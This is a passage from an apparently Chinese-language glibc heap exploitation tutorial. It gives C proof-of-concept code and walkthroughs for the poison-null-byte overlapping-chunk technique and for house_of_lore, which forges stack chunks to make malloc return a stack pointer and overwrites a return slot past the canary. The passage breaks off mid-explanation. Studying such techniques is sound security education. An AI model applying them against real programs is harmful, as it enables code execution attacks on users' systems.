        printf("Current b2 content:n%sn",b2);
        printf("Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').n");
        free(b1);
        free(c);
        printf("Finally, we allocate 'd', overlapping 'b2'.n");
        d = malloc(0x300);
        printf("d: %pn",d);
        printf("Now 'd' and 'b2' overlap.n");
        memset(d,'D',0x300);
        printf("New b2 content:n%sn",b2);
        printf("Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf "
            "for the clear explanation of this technique.n");
    }
**翻译：**
这个技术可被用于当可以被malloc的区域（也就是heap区域）存在一个单字节溢出漏洞的时候。
我们先分配0x100个字节的内存，代号'a'。
如果我们想要去溢出a的话，我们需要知道它的实际大小（因为空间复用的存在），在我的机器上是0x108。
然后接着我们分配0x200个字节，代号'b'。
再分配0x100个字节，代号'c'。
    uint8_t* a = malloc(0x100);
    uint8_t* b = malloc(0x200);
    uint8_t* c = malloc(0x100);
那么我们现在就有三个内存块：
    a: 0x100
    b: 0x200
    c: 0x100
在新版glibc环境下，我们需要在b内部更新size来pass **'chunksize(P) != prev_size
(next_chunk(P))'**
    *(size_t*)(b+0x1f0) = 0x200;
    free(b)
b.size: 0x211 == ((0x200 + 0x10) | pre_in_use)
我们在a实现一个单字节的 null byte 溢出。
之后 b.size = 0x200
此时c.presize = 0x210 但是没关系我们还是能pass掉前面那个check。
这个时候：
    b1 = malloc(0x100);
返回给b1的地址就是前面free掉的b的地址。
有趣的是现在C的presize在原来地址的后面两个单元位置处更新。 OK，我们再malloc一块内存。
    b2 = malloc(0x80);
此时刚才的presize依然会更新，而且b2整个块也仍然在原来b的内部。
之后我们将b1和c依次free。这会导致b1开始的位置一直到c的末尾中间的内存会合并成一块。
    free(b1);
    free(c);
    d = malloc(0x300);
返回的地址还是原来b的地址，重要的是刚才没有free的b2被包含在了里面！
我想这里的难点在于明白为什么后面的合并会发生。
还记得，在我们第一次free(b)之前，进行了如下的设置：
    *(size_t*)(b+0x1f0) = 0x200;
这一步非常关键，可以确保我们之后进行null byte溢出后，还能成功free(b)。
这和上一个例程house_of_spirit对fake_chunk_2进行的设置的道理是一样的，逃过 **'chunksize(P) !=
prev_size (next_chunk(P))'** 的检查。
之后分配b1和b2的时候，presize也会一直在(b+0x1f0)处更新。
而在最后free(c)的时候，检查的是c的presize位，而因为最开始的null byte溢出，导致这块区域的值一直没被更新，一直是b最开始的大小
0x210 。
而在free的过程中就会认为前面0x210个字节都是空闲的，于是就错误地进行了合并，然而glibc忽略了中间还有个可怜的b2。
更详细的讲解可以参考这篇paper
**0x05 house_of_lore**
****
【注】：源码我改动过，使其编译为64位可执行文件仍能正常运行。其实不改的话也能正常运行，不过改了之后看得更直观。
**源码**
    /*
    Advanced exploitation of the House of Lore - Malloc Maleficarum.
    This PoC take care also of the glibc hardening of smallbin corruption.
    [ ... ]
    else
    {
      bck = victim->bk;
      if (__glibc_unlikely (bck->fd != victim)){
         errstr = "malloc(): smallbin double linked list corrupted";
         goto errout;
      }
      set_inuse_bit_at_offset (victim, nb);
      bin->bk = bck;
      bck->fd = bin;
      [ ... ]
    */
    #include 
    #include 
    #include 
    #include 
    void jackpot(){ puts("Nice jump d00d"); exit(0); }
    int main(int argc, char * argv[]){
      intptr_t* stack_buffer_1[4] = {0};
      intptr_t* stack_buffer_2[3] = {0};
      printf("nWelcome to the House of Loren");
      printf("This is a revisited version that bypass also the hardening check introduced by glibc mallocn");
      printf("This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23nn");
      printf("Allocating the victim chunkn");
      intptr_t *victim = malloc(0x80);
      printf("Allocated the first small chunk on the heap at %pn", victim);
      // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
      intptr_t *victim_chunk = victim-2;
      printf("stack_buffer_1 at %p stack_buffer_1[1] at %pn", (void*)stack_buffer_1,(void*)&stack_buffer_1[1]);
      printf("stack_buffer_2 at %p stack_buffer_2[1] at %pn", (void*)stack_buffer_2,(void*)&stack_buffer_2[1]);
      printf("Create a fake chunk on the stackn");
      printf("Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted "
             "in second to the last malloc, which putting stack address on smallbin listn");
      stack_buffer_1[2] = victim_chunk;
      printf("Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
             "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
             "chunk on stackn");
      stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
      stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
      printf("Allocating another large chunk in order to avoid consolidating the top chunk with "
             "the small one during the free()n");
      void *p5 = malloc(1000);
      printf("Allocated the large chunk on the heap at %pn", p5);
      printf("Freeing the chunk %p, it will be inserted in the unsorted binn", victim);
      free((void*)victim);
      printf("nIn the unsorted bin the victim's fwd and bk pointers are niln");
      printf("victim->fwd: %pn", (void *)victim[0]);
      printf("victim->bk: %pnn", (void *)victim[1]);
      printf("Now performing a malloc that can't be handled by the UnsortedBin, nor the small binn");
      printf("This means that the chunk %p will be inserted in front of the SmallBinn", victim);
      void *p2 = malloc(1200);
      printf("The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %pn", p2);
      printf("The victim chunk has been sorted and its fwd and bk pointers updatedn");
      printf("victim->fwd: %pn", (void *)victim[0]);
      printf("victim->bk: %pnn", (void *)victim[1]);
      //------------VULNERABILITY-----------    
      printf("Now emulating a vulnerability that can overwrite the victim->bk pointern");
      victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
      //------------------------------------    
      printf("Now allocating a chunk with size equal to the first one freedn");
      printf("This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointern");
      void *p3 = malloc(0x80);
      printf("p3 = %pn",p3 );
      printf("This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bkn");
      char *p4 = malloc(0x80);
      printf("p4 = malloc(0x80)n");
      printf("nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %pn",
             stack_buffer_2[2]);
      printf("np4 is %p and should be on the stack!n", p4); // this chunk will be allocated on stack
      intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
      memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
    }
**翻译**
在栈上有分配两个数组如下
    intptr_t* stack_buffer_1[4] = {0};  
    intptr_t* stack_buffer_2[3] = {0};
分配好victim chunk
    victim = malloc(0x80)
    intptr_t* victim_chunk = victim-2;
这是heap上的第一个small chunk
然后在栈上制造一个fake chunk
    stack_buffer_1[2] = victim_chunk;
这里的 **stack_buffer_1[2]** 刚好是我们要构造的第一个fake_chunk的fd指针的位置。
上面的操作可以pass掉后面malloc对于smallbin的检查。
再进行下面的操作：
    stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
    stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
stack_buffer_1[3]是第一个fake chunk的bk字段
和上面一样是为了pass掉malloc的检查。
然后申请一块大内存，来防止等一下free的时候把我们精心构造好的victim chunk给合并了。
    void *p5 = malloc(1000);
现在把victim chunk给free掉，之后它会被放入unsortedbin中。
放入unsortedbin之后victim chunk的fd和bk会同时指向unsortedbin的头部。
现在执行一个不能被unsortedbin和smallbin响应的malloc。
    void *p2 = malloc(1200);
malloc之后victim chunk将会从unsortedbin转移到smallbin中。
同时它的fd和bk也会更新，改为指向smallbin的头部。
现在假设发生了溢出改写了victim的bk指针
    victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
现在开始malloc和victim大小相同的内存块。
    p3 = malloc(0x80);